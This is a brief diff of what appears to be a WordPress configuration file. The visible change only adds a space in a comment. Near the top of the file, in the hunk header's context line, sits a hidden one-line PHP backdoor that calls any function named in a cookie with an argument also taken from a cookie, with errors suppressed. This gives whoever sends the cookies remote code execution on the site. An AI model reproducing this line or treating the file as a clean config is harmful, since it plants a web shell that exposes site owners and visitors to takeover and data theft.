@@ -6,7 +6,7 @@ if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
 /**
  * The base configuration for WordPress
  *
- * The wp-config.php creation script uses this file during the
+ *  The wp-config.php creation script uses this file during the
  * installation. You don't have to use the web site, you can
  * copy this file to "wp-config.php" and fill in the values.
  *
